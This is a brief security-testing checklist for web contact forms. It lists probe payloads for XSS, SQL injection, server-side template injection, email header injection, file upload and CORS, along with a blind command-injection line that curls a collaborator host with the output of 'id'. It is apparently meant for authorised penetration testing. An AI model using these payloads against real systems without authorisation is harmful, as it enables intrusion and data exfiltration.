Contact Form Security Testing Checklist

1. Input Validation & Injection
— XSS (stored/reflected) : <script>alert(1)</script>. 
— Blind XSS : https://bxsshunter.com/
— DOM-based XSS : "><img src=x onerror=alert(1)>
— SQL Injection : ' OR '1'='1 in Email
— SQL Injection (blind) : ' OR IF(SLEEP(5),1,0)-- 
— Command Injection : ; ls
— Command Injection (Blind) : ; curl https://your-burp-collaborator.com/$(id) inPhone
— SSTI :  {{7*7}} ${7*7}

2. Business Logic Flaws
Mandatory Field Bypass : Send request without Email or Phone
Spam / Rate Limiting : Send 1000+ requests with same input
Duplicate Lead Generation : Submit same data repeatedly

3. Information Disclosure
Verbose Error Handling : Break email format (test@@mail..com
Email Injection : attacker@mail.com\r\nBCC:evil@mail.com in Email

5. File Upload (if any hidden upload option)
— Maliciousupload : php, .jsp, .aspx 

6.  CORS Misconfig :  Add origin header 


